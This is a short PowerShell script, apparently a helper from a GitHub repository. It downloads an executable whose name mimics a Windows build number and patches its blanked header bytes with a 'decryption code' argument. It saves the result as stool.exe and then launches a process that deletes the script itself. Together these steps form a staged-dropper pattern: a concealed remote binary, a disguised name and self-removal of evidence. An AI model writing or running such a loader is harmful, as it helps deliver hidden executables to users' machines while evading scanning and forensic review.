$repo = "https://raw.githubusercontent.com/dexterdreeeam/HelpScript/main/"
$binName = "10_0_23664_1000.exe"
$binUrl = "$repo/ST/$binName"
$binPath = Join-Path -Path $pwd -ChildPath $binName
$stoolPath = Join-Path -Path $pwd -ChildPath "stool.exe"
$code = $args[0]

function ValidStoolExist {
    $stoolExist = Test-Path $stoolPath -PathType Leaf
    if ($stoolExist) {
        $firstByte = Get-Content -Path $stoolPath -Encoding Byte -TotalCount 1
        if ($firstByte -ne 0) {
            return $true
        }
    }
    return $false
}

function MainEntry {
    if ($null -eq $code) {
        Write-Error "No decryption code provided"
        exit 1
    }
    $replace = [System.Text.Encoding]::ASCII.GetBytes($code)
    
    while (-not (ValidStoolExist)) {
        Remove-Item -Path $stoolPath -ErrorAction SilentlyContinue
        Invoke-WebRequest -Uri $binUrl -OutFile $binPath
        $stream = [System.IO.File]::Open(
            $binPath,
            [System.IO.FileMode]::Open,
            [System.IO.FileAccess]::ReadWrite)
        $stream.Position = 0
        $stream.Write($replace, 0, $replace.Length)
        $stream.Flush()
        $stream.Close()
        Start-Sleep -Seconds 3
        Rename-Item -Path $binPath -NewName $stoolPath
    }
}

try {
    MainEntry
}
catch {
    Write-Host "Exception:" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
    Write-Host $_.Exception.StackTrace -ForegroundColor Red
    exit 1
}

# Delete Self
$myPsPath = $MyInvocation.MyCommand.Path
Start-Process powershell -ArgumentList "Remove-Item `"$myPsPath`" -Force"
